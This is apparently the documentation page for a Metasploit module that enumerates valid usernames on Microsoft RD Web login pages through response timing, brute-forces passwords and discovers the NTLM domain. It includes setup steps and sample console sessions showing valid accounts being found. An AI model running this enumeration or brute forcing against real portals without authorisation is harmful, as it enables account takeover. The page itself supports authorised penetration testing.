## Vulnerable Application

The Microsoft RD Web login is vulnerable to the same type of authentication username enumeration vulnerability
that is present for OWA. By analyzing the time it takes for a failed response, the RDWeb interface can be used
to quickly test the validity of a set of usernames. The module additionally supports testing username password
combinations. Additionally, this module can attempt to discover the target NTLM domain if you don't already know it.

## Verification Steps


- [ ] Start `msfconsole`
- [ ] `use auxiliary/scanner/http/rdp_web_login`
- [ ] `set rhost TARGET_IP`
- [ ] `set username USER_OR_FILE`
- [ ] `set password PASSWORD_OR_FILE` (Only if you want to test the password brute forcing)
- [ ] `set domain DOMAIN` (Only if you don't want to test the domain discovery feature)
- [ ] Check output for validity of your test username(s), password(s), and domain


## Options

### domain

The target domain to use for the username checks. If not provided, enum_domain needs to be set to true so it can be discovered.

### enum_domain

Enumerate the domain by using an NTLM challenge/response and parsing the AD Domain out.

### username

Either a specific username to verify or a file with one username per line to verify.

### password

Either a specific password to attempt or a file with one password per line to verify.
If not provided, uses the same None password for all requests

## Scenarios
If an RDWeb login page is discovered, you can use this module to gather valid usernames for a brute force attack.

Specific target output replaced with Ys so as not to disclose information
```msf6 > use auxiliary/scanner/http/rdp_web_login
msf6 auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
username => /home/kali/users.txt
msf6 auxiliary(scanner/http/rdp_web_login) > set RHOSTS YY.YYY.YYY.YY
RHOSTS => YY.YYY.YYY.YY
msf6 auxiliary(scanner/http/rdp_web_login) > run

[*] Running for YY.YYY.YYY.YY...
[+] Found Domain: YYYYYYYYYYYY
[-] Username YYYYYYYYYYYY\wrong is invalid! No response received in 1250 milliseconds
[+] Username YYYYYYYYYYYY\YYYYY is valid! Response received in 628.877 milliseconds
[-] Username YYYYYYYYYYYY\k0pak4 is invalid! No response received in 1250 milliseconds
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed```

If an RDWeb login page is discovered, you can use this module to perform a brute force attack.
```msf6 > use auxiliary/scanner/http/rdp_web_login
msf6 auxiliary(scanner/http/rdp_web_login) > set RHOSTS 192.168.148.128
RHOSTS => 192.168.148.128
msf6 auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
username => /home/kali/users.txt
msf6 auxiliary(scanner/http/rdp_web_login) > set password /home/kali/passwords.txt
password => /home/kali/passwords.txt
msf6 auxiliary(scanner/http/rdp_web_login) > set timeout 500
timeout => 500
msf6 auxiliary(scanner/http/rdp_web_login) > run

[*] Running for YY.YYY.YYY.YY...
[+] Found Domain: YYYY
[-] Login YYYY\wrong:password is invalid! No response received in 500 milliseconds
[-] Login YYYY\wrong:Password1! is invalid! No response received in 500 milliseconds
[+] Password password is invalid but YYYY\k0pak4 is valid! Response received in 155.648 milliseconds
[+] Login YYYY\k0pak4:Password1! is valid!
[+] Password password is invalid but YYYY\Administrator is valid! Response received in 77.852 milliseconds
[+] Password Password1! is invalid but YYYY\Administrator is valid! Response received in 76.029 milliseconds
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed```

## Version and OS
Tested against Microsoft IIS 10.0 and RDWeb on Windows Server 2019
